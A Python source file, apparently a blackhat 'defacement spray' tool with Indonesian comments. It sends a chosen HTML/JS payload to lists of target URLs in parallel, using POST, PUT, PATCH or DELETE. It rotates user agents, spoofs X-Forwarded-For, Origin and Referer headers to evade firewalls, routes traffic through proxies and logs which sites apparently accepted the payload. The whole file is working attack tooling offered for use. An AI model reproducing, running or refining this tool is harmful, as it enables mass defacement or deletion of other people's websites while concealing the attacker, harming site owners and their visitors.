#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ELITE BLACKHAT APT DEFACEMENT SPRAY TOOL - OMEGA TIER (v3.0)
------------------------------------------------------------
Versi Ultimate untuk Operasi Skala Besar & High-Profile Targets.
Fitur Baru:
- Multi-Method Offensive (POST, PUT, PATCH, DELETE)
- Smart Jitter & Anti-Automation Delay
- Advanced Header Spoofing (UA, XFF, Origin, Referer)
- Deep Proxy Rotation Support
- JSON & Verbose Console Logging
- Session Pooling & Connection Reuse Optimized

Author: APT ELITE BLACKHAT
Version: 3.0 (Omega Edition)
"""

import os
import sys
import time
import socket
import ssl
import json
import random
import string
import logging
import argparse
from pathlib import Path
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3

# --- KONFIGURASI GLOBAL APT OMEGA ---
LOG_FILE = "apt_omega_spray_log.txt"
JSON_LOG_FILE = "apt_omega_results.json"
SUMMARY_FILE = "omega_spray_summary.txt"

DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
]

class OmegaConfig:
    """Konfigurasi Global Operasional."""
    def __init__(self):
        self.log_file = LOG_FILE
        self.json_file = JSON_LOG_FILE
        self.summary_file = SUMMARY_FILE
        self.verify_ssl_default = False # Agresif: Skip verifikasi SSL default
        self.default_timeout = 15
        self.max_threads = 20
        self.proxy = None
        self.method = "POST"
        self.custom_headers = {}

class OmegaLogger:
    """Logger profesional dengan output ganda: Text dramatis dan JSON parsable."""
    def __init__(self, log_file, json_file, summary_file):
        self.log_file = log_file
        self.json_file = json_file
        self.summary_file = summary_file
        
        # Setup Text Logger
        self.logger = logging.getLogger("OmegaElite")
        self.logger.setLevel(logging.DEBUG)
        
        # Handler File Text
        fh = logging.FileHandler(log_file, encoding='utf-8')
        fh.setLevel(logging.INFO)
        formatter = logging.Formatter('%(asctime)s [%(levelname)-8s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
        fh.setFormatter(formatter)
        self.logger.addHandler(fh)
        
        # Handler Console (Warna sederhana jika terminal mendukung)
        ch = logging.StreamHandler(sys.stdout)
        ch.setLevel(logging.INFO)
        ch.setFormatter(formatter)
        self.logger.addHandler(ch)

    def info(self, msg):
        self.logger.info(msg)

    def warning(self, msg):
        self.logger.warning(msg)

    def error(self, msg):
        self.logger.error(msg)

    def debug(self, msg):
        self.logger.debug(msg)

    def log_result(self, url, status_code, message, method, payload_size):
        """Simpan hasil ke format JSON untuk parsing mudah oleh tools lain."""
        result_entry = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "url": url,
            "status_code": status_code,
            "method": method,
            "payload_size": payload_size,
            "message": message
        }
        with open(self.json_file, 'a', encoding='utf-8') as f:
            f.write(json.dumps(result_entry) + "\n")

class NetworkEngine:
    """Mesin Jaringan dengan Retry, Proxy, dan Session Management."""
    def __init__(self, config: OmegaConfig):
        self.config = config
        self.session = requests.Session()
        
        # Konfigurasi Retry Adapter untuk koneksi robust
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["POST", "PUT", "PATCH", "DELETE"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("https://", adapter)
        self.session.mount("http://", adapter)

        # Nonaktifkan warning SSL jika perlu (Agresif)
        if not self.config.verify_ssl_default:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        # Setup Proxy jika ada
        if self.config.proxy:
            self.session.proxies = {
                'http': self.config.proxy,
                'https': self.config.proxy
            }

    def _get_target_url(self, raw_url):
        parsed = urlparse(raw_url.strip())
        if not parsed.scheme:
            return f"http://{raw_url.strip()}"
        return raw_url.strip()

    def _check_connectivity(self, url):
        try:
            hostname = urlparse(url).hostname
            if not hostname:
                return False
            socket.getaddrinfo(hostname, None)
            return True
        except socket.gaierror:
            return False

class PayloadEngine:
    """Manajemen Payload dan Header Dinamis."""
    def __init__(self, payload_content, custom_headers=None):
        self.payload = payload_content
        self.base_headers = custom_headers or {}

    def generate_headers(self):
        """Rotasi Header lengkap untuk evasi WAF."""
        ua = random.choice(DEFAULT_USER_AGENTS)
        headers = self.base_headers.copy()
        headers['User-Agent'] = ua
        headers['Accept'] = '*/*'
        headers['Accept-Language'] = random.choice(['en-US,en;q=0.9', 'id-ID,id;q=0.8', 'ja-JP,ja;q=0.7'])
        headers['Accept-Encoding'] = 'gzip, deflate, br'
        headers['Connection'] = 'keep-alive'
        
        # Spoofing X-Forwarded-For
        xff = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        headers['X-Forwarded-For'] = xff
        
        # Spoofing Origin
        parsed_origin = urlparse(random.choice(["https://google.com", "https://github.com", "https://example.com"]))
        headers['Origin'] = parsed_origin.geturl()
        
        # Random Referer
        headers['Referer'] = f"https://{parsed_origin.hostname}/search?q=random+query"

        return headers

class SprayCore:
    """Inti dari Operasi Spray."""
    def __init__(self, config: OmegaConfig, network_engine: NetworkEngine, payload_engine: PayloadEngine, logger: OmegaLogger):
        self.config = config
        self.network = network_engine
        self.payload = payload_engine
        self.logger = logger

    def spray_single(self, url):
        target_url = self.network._get_target_url(url)
        
        if not self.network._check_connectivity(target_url):
            return (0, f"[DNS FAIL] {target_url}", "UNKNOWN")

        # Rotasi Header Lengkap
        current_headers = self.payload.generate_headers()
        
        # Jitter Acak sebelum request (Anti-Automation)
        jitter = random.uniform(0.1, 0.5)
        time.sleep(jitter)

        try:
            response = self.network.session.request(
                method=self.config.method,
                url=target_url,
                data=self.payload.payload,
                headers=current_headers,
                timeout=self.config.default_timeout,
                verify=self.config.verify_ssl_default
            )
            
            status_code = response.status_code
            
            # Logika Status Code untuk Defacement
            if status_code in [200, 201, 204]:
                msg = f"[SUCCESS] {target_url} -> Status: {status_code} | Method: {self.config.method}"
                self.logger.info(msg)
                self.logger.log_result(target_url, status_code, "Success", self.config.method, len(self.payload.payload))
                return (status_code, msg, "SUCCESS")
            elif status_code in [301, 302]:
                msg = f"[REDIRECT] {target_url} -> Status: {status_code} | Target: {response.headers.get('Location', 'N/A')} | Method: {self.config.method}"
                self.logger.info(msg)
                self.logger.log_result(target_url, status_code, "Redirect", self.config.method, len(self.payload.payload))
                return (status_code, msg, "REDIRECT")
            else:
                msg = f"[FAIL] {target_url} -> Status: {status_code} | Method: {self.config.method}"
                self.logger.warning(msg)
                self.logger.log_result(target_url, status_code, "Fail", self.config.method, len(self.payload.payload))
                return (status_code, msg, "FAIL")

        except requests.exceptions.Timeout:
            msg = f"[TIMEOUT] {target_url}"
            self.logger.error(msg)
            self.logger.log_result(target_url, 0, "Timeout", self.config.method, len(self.payload.payload))
            return (0, msg, "TIMEOUT")
        except requests.exceptions.ConnectionError:
            msg = f"[CONN ERROR] {target_url}"
            self.logger.error(msg)
            self.logger.log_result(target_url, 0, "Connection Error", self.config.method, len(self.payload.payload))
            return (0, msg, "CONN_ERROR")
        except Exception as e:
            msg = f"[ERROR] {target_url} -> {str(e)}"
            self.logger.error(msg)
            self.logger.log_result(target_url, 0, str(e), self.config.method, len(self.payload.payload))
            return (0, msg, "ERROR")

class ReportEngine:
    """Engine Pelaporan Akhir Operasi."""
    def __init__(self, logger: OmegaLogger):
        self.logger = logger

    def print_summary(self, successful, redirects, failed, other, start_time, end_time):
        duration = end_time - start_time
        self.logger.info("-" * 60)
        self.logger.info(f"OPERASI OMEGA SELESAI! Total Waktu: {duration:.2f} detik")
        self.logger.info(f"Sukses: {len(successful)} | Redirect: {len(redirects)} | Gagal: {len(failed)} | Lainnya: {len(other)}")
        self.logger.info(f"Log Detail: {self.logger.log_file}")
        self.logger.info(f"Hasil JSON: {self.logger.json_file}")
        self.logger.info("-" * 60)

        # Simpan ringkasan ke file text juga
        with open(self.logger.summary_file, "w", encoding="utf-8") as f:
            f.write(f"OMEGA TIER SPRAY SUMMARY\n")
            f.write(f"Total Time: {duration:.2f}s\n")
            f.write(f"Successful: {len(successful)}\n")
            f.write(f"Redirects: {len(redirects)}\n")
            f.write(f"Failed: {len(failed)}\n")
            f.write("-" * 50 + "\n")
            for res in successful:
                f.write(res + "\n")
            f.write("-" * 50 + "\n")
            for res in redirects:
                f.write(res + "\n")
            f.write("-" * 50 + "\n")
            for res in failed:
                f.write(res + "\n")

def load_payload_from_file(file_path):
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    else:
        raise FileNotFoundError(f"File payload '{file_path}' tidak ditemukan.")

def main():
    parser = argparse.ArgumentParser(description="ELITE BLACKHAT APT DEFACEMENT SPRAY TOOL - OMEGA TIER")
    parser.add_argument("-p", "--payload", required=True, help="Path ke file payload (HTML/JS) atau string payload langsung.")
    parser.add_argument("-t", "--targets", nargs='+', required=True, help="URL target atau path ke file daftar URL.")
    parser.add_argument("--threads", type=int, default=20, help="Jumlah thread paralel (default: 20).")
    parser.add_argument("--timeout", type=int, default=15, help="Timeout koneksi per request (default: 15s).")
    parser.add_argument("--no-ssl", action="store_true", help="Jangan verifikasi sertifikat SSL.")
    parser.add_argument("--header", action="append", help="Header kustom tambahan (format: 'Key: Value'). Bisa berkali-kali.")
    parser.add_argument("--proxy", help="Proxy URL (http://user:pass@ip:port).")
    parser.add_argument("--method", choices=["POST", "PUT", "PATCH", "DELETE"], default="POST", help="HTTP Method untuk spray (default: POST).")
    
    args = parser.parse_args()

    # Load Payload
    payload_content = ""
    if os.path.exists(args.payload):
        try:
            payload_content = load_payload_from_file(args.payload)
        except Exception as e:
            print(f"Gagal memuat payload: {e}")
            sys.exit(1)
    else:
        payload_content = args.payload

    if not payload_content:
        print("Payload kosong!")
        sys.exit(1)

    # Setup Config
    config = OmegaConfig()
    config.max_threads = args.threads
    config.default_timeout = args.timeout
    config.verify_ssl_default = not args.no_ssl
    config.proxy = args.proxy
    config.method = args.method
    
    custom_headers = {}
    if args.header:
        for h in args.header:
            if ':' in h:
                key, val = h.split(':', 1)
                custom_headers[key.strip()] = val.strip()
    config.custom_headers = custom_headers

    # Inisialisasi Modul
    logger = OmegaLogger(config.log_file, config.json_file, config.summary_file)
    network_engine = NetworkEngine(config)
    payload_engine = PayloadEngine(payload_content, config.custom_headers)
    spray_core = SprayCore(config, network_engine, payload_engine, logger)
    report_engine = ReportEngine(logger)

    # Load Targets
    targets = []
    if isinstance(args.targets, str) and os.path.isfile(args.targets):
        with open(args.targets, 'r', encoding='utf-8') as f:
            targets = [line.strip() for line in f if line.strip()]
    elif isinstance(args.targets, list):
        targets = args.targets
    else:
        targets = [t.strip() for t in args.targets[0].split('\n') if t.strip()]

    if not targets:
        logger.warning("Tidak ada target valid.")
        return

    logger.info(f"Memulai Operasi OMEGA ke {len(targets)} target | Threads: {config.max_threads} | Method: {config.method}")
    
    successful = []
    failed = []
    redirects = []
    other = []

    start_time = time.time()

    # Gunakan ThreadPoolExecutor dengan maksimum workers
    with ThreadPoolExecutor(max_workers=config.max_threads) as executor:
        future_to_url = {executor.submit(spray_core.spray_single, url): url for url in targets}
        
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                status_code, message, category = future.result()
                if category == "SUCCESS":
                    successful.append(message)
                elif category == "REDIRECT":
                    redirects.append(message)
                elif category in ["TIMEOUT", "CONN_ERROR", "ERROR"]:
                    failed.append(message)
                else:
                    other.append(message)
            except Exception as exc:
                logger.error(f"Target {url} generated an unhandled exception: {exc}")
                failed.append(f"[UNKNOWN] {url}")

    end_time = time.time()
    
    # Generate Laporan
    report_engine.print_summary(successful, redirects, failed, other, start_time, end_time)

if __name__ == "__main__":
    main()
